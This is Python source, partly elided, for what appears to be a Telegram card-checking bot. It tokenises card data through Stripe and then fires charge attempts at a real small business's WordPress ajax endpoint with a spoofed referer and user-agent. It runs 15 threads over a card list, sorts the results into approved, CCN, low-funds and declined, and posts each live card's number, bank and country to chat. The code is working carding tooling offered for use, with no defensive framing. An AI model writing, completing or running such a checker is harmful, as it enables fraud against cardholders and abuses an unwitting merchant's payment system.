...
def process_card(cc_data):
    ...
    try:
        # Tokenize
        stripe_req = session.post('https://api.stripe.com/v1/payment_methods', data={
        ...
        stripe_res = stripe_req.json()
        
        if 'id' not in stripe_res:
            # Capturing raw Stripe error as real response
            raw_err = stripe_res.get('error', {}).get('message', 'Stripe Tokenization Failed')
            return {"status": "Declined ❌", "msg": raw_err, "info": info_str, "country": country_info, "bank": bank_name, "card": cc_data}

        # Charge
        site_req = session.post('https://www.perhamvillage.co.uk/wp-admin/admin-ajax.php', data={
        ...
        }, headers={'user-agent': ua, 'referer': 'https://www.perhamvillage.co.uk/'}, timeout=15)

        site_res = site_req.json()
        raw_site_msg = site_res.get('message', 'No site response')
        low_msg = raw_site_msg.lower()
        ...
        # Return raw site message in "msg" field
        return {"status": status, "msg": raw_site_msg, "info": info_str, "country": country_info, "bank": bank_name, "card": cc_data}
    except Exception as e: 
        return {"status": "Error ⚠️", "msg": str(e), "info": info_str, "country": country_info, "bank": bank_name, "card": cc_data}
...
def create_ui(card, status, reason, country, approved, ccn, low, declined, total, current):
    return (f"<b>• CARD:</b> <code>{card}</code>\n"
            ...
            f"<b>• REASON:</b> {reason}\n"
            f"━━━━━━━━━━━━━━\n"
            f"<b>• Approved ✅: [{approved}]</b>\n"
            f"<b>• CCN ☑️: [{ccn}]</b>\n"
            f"<b>• Low Funds 💰: [{low}]</b>\n"
            f"<b>• DECLINED ❌: [{declined}]</b>\n"
            f"<b>• TOTAL 📊: [{current}/{total}]</b>\n"
            f"━━━━━━━━━━━━━━")
    ...
    with ThreadPoolExecutor(max_workers=15) as executor:
        for i, res in enumerate(executor.map(process_card, lines), 1):
            ...
            if any(x in res['status'] for x in ["Approved", "CCN", "Insufficient", "3DS"]):
                hit_text = (f"━━━━━━━━━━━\n"
                            f"<b>[ﾒ] Info ➜ {res['info']}</b>\n"
                            f"<b>[ﾒ] Bank ➜ {res['bank']}</b>\n"
                            f"<b>[ﾒ] Country ➜ {res['country']}</b>\n"
                            f"━━━━━━━━━━━\n"
                            f"<b>[ﾒ] Card ➜ </b><code>{res['card']}</code>\n"
                            f"<b>[ﾒ] Status ➜ {res['status']}</b>\n"
                            f"<b>[ﾒ] Response ➜ {res['msg']}</b>\n"
                            f"━━━━━━━━━━━\n"
                            f"<b>[ﾒ] Checked By ➜ {m.from_user.first_name}</b>")
...
print("Bot is running with Debug Response Logic...")
